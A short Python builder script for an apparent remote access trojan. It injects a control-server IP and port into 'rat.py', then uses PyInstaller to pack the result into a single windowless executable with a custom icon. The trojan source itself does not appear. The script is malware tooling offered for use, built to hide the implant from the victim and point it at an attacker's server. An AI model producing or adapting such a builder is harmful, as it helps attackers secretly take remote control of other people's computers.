import PyInstaller.__main__
IP = "localhost"
PORT = 8000

with open('rat.py', 'r') as file:
    filedata = file.read()

filedata = filedata.replace('EIP', f'"{IP}"')
filedata = filedata.replace('EPORT', f'{PORT}')

with open('mrat.py', 'w') as file:
    file.write(filedata)
print("succesfuly modified!")



PyInstaller.__main__.run([
    'mrat.py',
    '--onefile',
    '--noconsole',
    '--icon=5daee883eed0789df7a96d8ffe89def35edc1431.ico'
])